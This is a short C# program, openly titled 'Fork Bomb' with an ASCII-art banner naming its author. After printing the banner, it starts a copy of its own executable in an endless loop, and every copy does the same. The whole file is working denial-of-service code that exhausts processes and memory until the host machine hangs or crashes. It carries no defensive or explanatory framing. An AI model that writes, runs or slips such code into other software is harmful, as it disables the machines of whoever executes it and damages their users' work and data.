using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Reflection;

namespace ForkBomb
{
    class Program
    {
        static void Main(string[] args)
        {
                System.Console.WriteLine(@"
                                    ========================================
                                      Fork Bomb      -      AntonyGeorgiades
                                    ========================================
                                         |||| 
                                         ||||
                                         \__|
                                          ||      
                                          || 
                                          ||
                                          ||   
                                            ");

            bool Trigger = true;
            //Creating an endless loop which will create childs (clones of this instance that will keep cloning)
            while (Trigger == true)
            {
               Process.Start(Assembly.GetExecutingAssembly().Location);
            }
        }
    }
}
